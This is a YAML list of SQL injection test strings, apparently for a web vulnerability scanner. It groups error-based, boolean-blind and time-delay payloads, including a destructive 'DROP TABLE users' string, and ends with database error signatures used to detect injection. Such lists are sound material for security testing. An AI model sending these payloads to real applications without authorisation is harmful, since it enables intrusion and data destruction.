# SQL injection payloads
error_based:
  - "'"
  - "\""
  - "' OR '1'='1"
  - "\" OR \"1\"=\"1"
  - "' OR '1'='1' --"
  - "' OR '1'='1' #"
  - "' OR 1=1 --"
  - "1' OR '1'='1"
  - "admin' --"
  - "1; DROP TABLE users --"
  - "' UNION SELECT NULL --"
  - "' UNION SELECT NULL, NULL --"
  - "') OR ('1'='1"
  - "1 OR 1=1"
  - "' OR ''='"

boolean_blind:
  - "' AND '1'='1"
  - "' AND '1'='2"
  - "1 AND 1=1"
  - "1 AND 1=2"
  - "' AND 1=1 --"
  - "' AND 1=2 --"
  - "1' AND '1'='1' --"
  - "1' AND '1'='2' --"

time_blind:
  - "' OR SLEEP(3) --"
  - "'; WAITFOR DELAY '0:0:3' --"
  - "' OR pg_sleep(3) --"
  - "1; SELECT SLEEP(3)"
  - "' AND SLEEP(3) AND '1'='1"
  - "1' AND (SELECT * FROM (SELECT SLEEP(3))a) --"

error_signatures:
  - "SQL syntax"
  - "mysql_fetch"
  - "ORA-"
  - "PG::SyntaxError"
  - "sqlite3.OperationalError"
  - "SQLSTATE"
  - "Microsoft OLE DB"
  - "Unclosed quotation mark"
  - "quoted string not properly terminated"
  - "You have an error in your SQL syntax"
  - "Warning: mysql"
  - "PostgreSQL"
  - "org.postgresql"
  - "com.mysql"
